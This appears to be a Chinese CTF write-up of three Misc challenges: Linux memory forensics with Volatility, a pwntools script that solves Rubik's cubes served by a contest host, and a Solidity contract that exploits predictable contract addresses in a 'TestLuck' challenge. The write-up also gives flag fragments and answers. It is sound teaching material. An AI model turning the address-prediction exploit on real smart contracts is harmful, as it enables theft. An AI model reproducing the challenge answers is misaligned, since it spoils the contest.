事实上CTF赛事中的密码学可能对未来工作、就业的帮助不是那么大(甚至在今天有人劝我考公)，但密码学却是信息安全的基础建设之一，而且也能帮助自己快速入门算法、参与竞赛。在一些逆向破解的活动中，密码学中学到的技巧也确确实实地给了我挺大的帮助(一眼定算法，手撕密钥……)，总之学以致用，干就完了。

### Misc

#### oh-my-linux

由文件头可得这是linux内存镜像，需要制作相应的profile来进行分析

先查看版本

![](https://c.img.dasctf.com/images/202333/1677821433963-fb4fda51-77cf-40de-b80a-45dbe7e3a17d.png)

```
Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.162-1 (2023-01-21)
```

去http://files.trendmicro.com/documentation/guides/deep_security/Kernel%20Support/12.0/Deep_Security_12_0_kernels_EN.html#Debian上搜索得知是debian11，安装好对应的内核之后就可以开始做profile

```bash
sudo apt install build-essential dwarfdump
git clone https://github.com/volatilityfoundation/volatility
cd volatility/tools/linux
make
```

debian新版本的systemmap可以在https://debian.sipwise.com/debian-security/pool/main/l/linux/这里找到

做完profile就可以开始取证，先看看命令行

![](https://c.img.dasctf.com/images/202333/1677821668933-f0aa2417-cd8c-4f6b-902a-dbec6d29469b.png)

这里可以看出出题人觉得bash没有zsh好用，于是就去用zsh了，于是接下来要做的就是去找到和zsh相关的东西，如zsh_history和zshrc，这里可以选择直接恢复文件系统来查看对应的文件

```bash
python2 vol.py -f ../mem --profile=Linuxdebian51021x64 linux_recover_filesystem --dump-dir=../files/
```

恢复完毕后，就可以看到/home/mylinux下的zsh相关文件，先看看历史记录

![](https://c.img.dasctf.com/images/202333/1677822814871-4bffb6e0-8efc-45d5-9491-602e8344ac76.png)

可以看到执行的命令并不多，先是安装了oh-my-zsh后查看了当前的默认shell，然后将flag1的主题移到了oh-my-zsh主题文件夹下，随后修改zshrc并应用。接着，又用默认shell为密码把flag2加密到了flag2.zip里，最后执行了未知命令G1v3m3F14ggg3

接下来思路就明确了，先去查找mysecretflag1.zsh-theme，可以在/home/mylinux/.oh-my-zsh/themes下找到，打开即可发现flag1

![](https://c.img.dasctf.com/images/202333/1677823072214-bbf419d2-bde0-4726-944f-7858426f307d.png)

然后就是flag2.zip，可以在桌面上找到，由于安装oh-my-zsh可以改变当前默认shell，所以密码是/usr/bin/zsh，解压缩包即可得到第二段flag

```
flag2:3d30-47f3-b79c
```

最后是那个未知命令G1v3m3F14ggg3，由于修改过zshrc，所以可以想到这可能是在zshrc中自定义的一个命令，查看一下可以发现确实如此

```bash
alias G1v3m3F14ggg3="echo ICAgICBfXyAgICAgXyAgICAgICAgICAgICAgX18gXyAgICBfX19fICAgICBfICAgICAgICAgICAgICAgXyAgICAgXyBfICAgICAgX19fXyAgICAgICAgICAgIF9fXyAgICAgICAgICAgICAgX18gICAgXyBfICAgICAgX19fXyAgICBfX18gICAgIF9fXyAgICAgIF9fICAgIFwiXCAgICANCiAgICAvIF98ICAgfCB8ICAgIF9fIF8gICAgLyBfYCB8ICB8X18gLyAgICAoXykgICAgIF9fXyAgICAgLyB8ICAgfCB8IHwgICAgfF9fICB8ICAgX19fICAgIC8gXyBcICAgIF9fICAgICAgLyAgXCAgfCB8IHwgICAgfF9fIC8gICAoIF8gKSAgIHwgX198ICAgIC8gIFwgICAgfCB8XyAgDQogICB8ICBffCAgIHwgfCAgIC8gX2AgfCAgIFxfXywgfCAgIHxfIFwgICAgIF8gICAgIHxfX198ICAgIHwgfCAgIHxfICBffCAgICAgLyAvICAgLyAtXykgICBcXywgLyAgIC8gX3wgICAgfCAoKSB8IHxfICBffCAgICB8XyBcICAgLyBfIFwgICB8X18gXCAgIHwgKCkgfCAgIHwgfCAgIA0KICBffF98XyAgIF98X3xfICBcX18sX3wgICB8X19fLyAgIHxfX18vICAgXyhfKV8gICBfX19fXyAgIF98X3xfICAgX3xffF8gICBfL18vXyAgIFxfX198ICAgXy9fL18gICBcX198XyAgIF9cX18vICAgX3xffF8gICB8X19fLyAgIFxfX18vICAgfF9fXy8gICBfXF9fLyAgIC9fL19fICANCl98IiIiIiJ8X3wiIiIiInxffCIiIiIifF98IiIiIiJ8X3wiIiIiInxffCIiIiIifF98ICAgICB8X3wiIiIiInxffCIiIiIifF98IiIiIiJ8X3wiIiIiInxffCIiIiIifF98IiIiIiJ8X3wiIiIiInxffCIiIiIifF98IiIiIiJ8X3wiIiIiInxffCIiIiIifF98IiIiIiJ8X3wiIiIiInwgDQoiYC0wLTAtJyJgLTAtMC0nImAtMC0wLSciYC0wLTAtJyJgLTAtMC0nImAtMC0wLSciYC0wLTAtJyJgLTAtMC0nImAtMC0wLSciYC0wLTAtJyJgLTAtMC0nImAtMC0wLSciYC0wLTAtJyJgLTAtMC0nImAtMC0wLSciYC0wLTAtJyJgLTAtMC0nImAtMC0wLSciYC0wLTAtJyJgLTAtMC0nIA==| base64 -d"
```

运行一下这一段即可获得flag3

![](https://c.img.dasctf.com/images/202333/1677823330575-b50818ab-a55d-425c-a47f-3f5813471c90.png)

#### 魔方大师

没啥可说的，只需要接受魔方然后算法处理再输出步骤发过去即可，下面是某选手的exp

```python
import numpy as np
import copy as cp
import re
from pwn import *
import kociemba

num_to_color = {
    '0': 'f',  # 黄色
    '1': 'b',  # 白色
    '2': 'r',  # 红色
    '3': 'd',  # 绿色
    '4': 'l',  # 橙色
    '5': 'u'  # 蓝色
}

color_to_number = {
    (255, 255, 0): '0',  # 黄色
    (255, 255, 255): '1',  # 白色
    (255, 0, 0): '2',  # 红色
    (0, 255, 0): '3',  # 绿色
    (255, 150, 50): '4',  # 橙色
    (0, 0, 255): '5'  # 蓝色
}

def toString(FACES):
    print()
    for i in range(3):
        print("     ", int(FACES[0][i][0]), int(FACES[0][i][1]), int(FACES[0][i][2]))
    for i in range(3):
        print(int(FACES[2][i][0]), int(FACES[2][i][1]), int(FACES[2][i][2]), end=" ")
        print(int(FACES[4][i][0]), int(FACES[4][i][1]), int(FACES[4][i][2]), end=" ")
        print(int(FACES[3][i][0]), int(FACES[3][i][1]), int(FACES[3][i][2]), end=" ")
        print(int(FACES[5][i][0]), int(FACES[5][i][1]), int(FACES[5][i][2]))
    for i in range(3):
        print("     ", int(FACES[1][i][0]), int(FACES[1][i][1]), int(FACES[1][i][2]))
    print()


def SSSS(sendsolve):
    send = ''
    for i in sendsolve:
        if len(i) > 1:
            if i[-1] == "'":
                send += i[0].lower()
            if i[-1] == "2":
                send += i[0] + i[0]
        else:
            send += i[0]
    return send


def GetColor(FACES, input_string):
    # 使用正则表达式匹配颜色代码
    color_pattern = r'\x1b\[38;2;(\d+);(\d+);(\d+)m'
    matches = re.findall(color_pattern, input_string)

    # 提取颜色并映射为数字
    result = ''.join([color_to_number.get(tuple(map(int, match)), 'X') for match in matches])

    k = 0
    for i in range(3):
        FACES[0][i][0] = result[k]
        FACES[0][i][1] = result[k + 1]
        FACES[0][i][2] = result[k + 2]
        k += 3
    for i in range(3):
        for j in range(3):
            FACES[2][i][j] = result[k + j]
        k = k + 3
        for j in range(3):
            FACES[4][i][j] = result[k + j]
        k += 3
        for j in range(3):
            FACES[3][i][j] = result[k + j]
        k += 3
        for j in range(3):
            FACES[5][i][j] = result[k + j]
        k += 3

    for i in range(3):
        for j in range(3):
            FACES[1][i][j] = result[k + j]
        k += 3


faces = [np.zeros((3, 3))]

for i in range(1, 6):
    faces.append(np.ones((3, 3)) + faces[i - 1])



'''
                          |************|
                          |*U1**U2**U3*|
                          |************|
                          |*U4**U5**U6*|
                          |************|
                          |*U7**U8**U9*|
                          |************|
              ************|************|************|************|
              *L1**L2**L3*|*F1**F2**F3*|*R1**R2**R3*|*B1**B2**B3*|
              ************|************|************|************|
              *L4**L5**L6*|*F4**F5**F6*|*R4**R5**R6*|*B4**B5**B6*|
              ************|************|************|************|
              *L7**L8**L9*|*F7**F8**F9*|*R7**R8**R9*|*B7**B8**B9*|
              ************|************|************|************|
                          |************|
                          |*D1**D2**D3*|
                          |************|
                          |*D4**D5**D6*|
                          |************|
                          |*D7**D8**D9*|
                          |************|
'''


io = remote('124.220.8.243', 1337)
io.recvuntil(b'your choice:')
io.sendline(b'3')
n = 0
for q in range(50):
    n += 1
    a = io.recvuntil(b'Please')
    GetColor(faces, a.decode())

    toString(faces)
    lst = '034125'
    num1 = ''
    num2 = ''
    for k in lst:
        for i in range(3):
            for j in range(3):
                num1 += num_to_color[str(int(faces[int(k)][i][j]))]
    print()
    for k in lst:
        num2 += num_to_color[str(int(faces[int(k)][1][1]))] * 9

    sendsolve = kociemba.solve(num1.upper(), num2.upper())
    sendsolve = sendsolve.split(' ')

    sendsolve = SSSS(sendsolve)
    print(sendsolve)

    io.recvuntil(b'your choice:')
    io.sendline(b'2')
    io.recvuntil(b'your step:')
    io.sendline(sendsolve.encode())
    io.recvuntil(b'your choice:')
    io.sendline(b'3')

io.interactive()
```

通关第三阶段即可获得flag

(第一阶段会获得神必小链接，第二阶段会获得flag的md5值

#### TestYourLuck

新生成合约的地址计算，参考文章：

https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed

可以按照这个原理写一个python脚本来计算啥时候才能生成一个满足条件的地址

```python
from web3 import Web3

for i in range(1,255):
    address = "0x943891A44EEA7e1c5871c4Ae13277539a1399C2BAF"[2:]
    data = '0xd694'+ address + hex(i)[2:].zfill(2)
    if(int(Web3.to_hex(Web3.keccak(hexstr=data))[-40:],16) % 50 == 30):
        print(i)
```

然后选个最小的减一之后填入exp里的循环里即可

exp.sol:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

    Exploit public exp;

    constructor() {}

    function attack(address target) public{
        while (true) {
            exp = new Exploit(target);
            if (uint256(uint160(address(exp))) % 50 == 20){
                break;
            }
        }
    }
}


contract Exploit {

    address target;

    constructor(address _target){
        target = _target;
        if (uint256(uint160(address(this))) % 50 == 20){
            for(uint i; i < 33; i++) {
                TestLuck(target).makevoid();
            }
            TestLuck(target).checkyourluck();
            TestLuck(target).isSolved();
        }
    }
}

interface TestLuck {
    function makevoid() external;
    function checkyourluck() external;
    function isSolved() external;
}
```